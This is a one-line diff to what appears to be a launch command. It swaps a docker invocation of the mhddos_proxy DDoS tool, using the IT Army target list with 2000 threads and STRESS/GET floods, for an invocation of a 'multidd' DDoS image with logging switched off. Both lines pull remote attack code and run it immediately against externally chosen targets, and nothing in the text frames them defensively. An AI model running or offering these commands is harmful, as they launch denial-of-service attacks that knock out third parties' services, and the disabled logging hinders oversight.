@@ -1,1 +1,1 @@
-sudo docker run --cpus 0.7 -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --itarmy --http-methods GET STRESS -t 2000 --debug
+sudo docker run --cpus 0.75 -it --rm --log-driver none --name multidd --pull always karboduck/multidd
